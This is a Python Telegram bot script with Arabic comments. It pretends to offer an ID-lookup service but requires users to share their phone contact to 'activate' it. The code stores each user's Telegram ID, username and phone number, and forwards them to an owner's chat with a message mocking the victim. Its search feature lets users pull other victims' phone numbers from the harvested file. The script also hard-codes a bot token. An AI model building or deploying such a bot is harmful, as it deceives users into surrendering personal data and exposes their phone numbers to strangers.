import telebot
from telebot import types
import json

bot = telebot.TeleBot("7241156684:AAHYjaOj_Xuc-0weajxW3JUwkJiHhjR1ZNo")
ATTEMPTS_FILE = 'attempts.txt'
INITIAL_ATTEMPTS = 3

# التعامل مع الأمر /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    # تحقق مما إذا كان المستخدم قد أرسل الجهة سابقًا
    with open('pssj.txt', 'r') as file:
        if any(str(user_id) in line for line in file):
            attempts = get_attempts(user_id)
            if attempts is None:
                add_user_attempts(user_id, INITIAL_ATTEMPTS)
                attempts = INITIAL_ATTEMPTS
            bot.send_message(message.chat.id, f"Welcome, Your attempts: {attempts} You can search by ID only.")
        else:
            bot.reply_to(message, """Welcome : [{}](t.me/{})

Send your contact to activate the bot, according to the bot’s conditions.

Thanks.

Wait...""".format(message.from_user.first_name, message.from_user.username), parse_mode="Markdown")

            keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            contact_button = types.KeyboardButton(text="Send My Contact", request_contact=True)
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text="Click on the “Send my Contact” button to activate the bot.", reply_markup=keyboard)

# التعامل مع استقبال الجهة
@bot.message_handler(content_types=['contact'])
def contact_received(message):
    if message.contact is None or message.contact.user_id != message.from_user.id:
        bot.send_message(chat_id=message.chat.id, text="Send your contact.")
        return

    U = message.from_user.username
    i = message.from_user.id
    P = message.contact.phone_number

    # تخزين البيانات في ملف pssj.txt
    with open('pssj.txt', 'a') as file:
        file.write(f"ID:{i}, Number:{P}, Username:{U}\n")

    # تعيين المحاولات الأولية للمستخدم
    add_user_attempts(i, INITIAL_ATTEMPTS)

    bot.send_message(message.chat.id, "Activated. Send /start")

    bot.send_message(6214674757, f"""
تم تلقي مضحكة جديدة OWNERS: @NB_JG

الايدي {i}
اليوزر @{U}
الرقم +{P}

OWNER : @NB_JG
""")

# التعامل مع البحث في ملف result.txt
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id

    # تحقق من وجود الجهة في pssj.txt
    with open('pssj.txt', 'r') as file:
        authorized = any(str(user_id) in line for line in file)

    if authorized:
        # تحقق من عدد المحاولات المتبقية
        attempts_left = get_attempts(user_id)
        if attempts_left > 0:
            # البحث في ملف result.txt
            with open("pssj.txt", "r") as file:
                value = message.text
                found = False

                for line in file:
                    if value in line:
                        bot.send_message(message.chat.id, line)
                        found = True
                        break

            if not found:
                bot.send_message(message.chat.id, "User not found, Send another user.")

            # تقليل عدد المحاولات المتبقية
            update_attempts(user_id, attempts_left - 1)
            bot.send_message(message.chat.id, f"Remaining attempts: {attempts_left - 1}")
        else:
            bot.send_message(message.chat.id, "You don't have enough attempts. Contact the developer @NB_JG")
    else:
        bot.send_message(message.chat.id, "Ha, send your contact first thing, you can't search!")

def get_attempts(user_id):
    with open(ATTEMPTS_FILE, 'r') as file:
        for line in file:
            uid, attempts = line.strip().split(',')
            if int(uid) == user_id:
                return int(attempts)
    return None

def add_user_attempts(user_id, attempts):
    with open(ATTEMPTS_FILE, 'a') as file:
        file.write(f"{user_id},{attempts}\n")

def update_attempts(user_id, attempts):
    lines = []
    with open(ATTEMPTS_FILE, 'r') as file:
        lines = file.readlines()

    with open(ATTEMPTS_FILE, 'w') as file:
        for line in lines:
            uid, _ = line.strip().split(',')
            if int(uid) == user_id:
                file.write(f"{user_id},{attempts}\n")
            else:
                file.write(line)

bot.polling(none_stop=True)
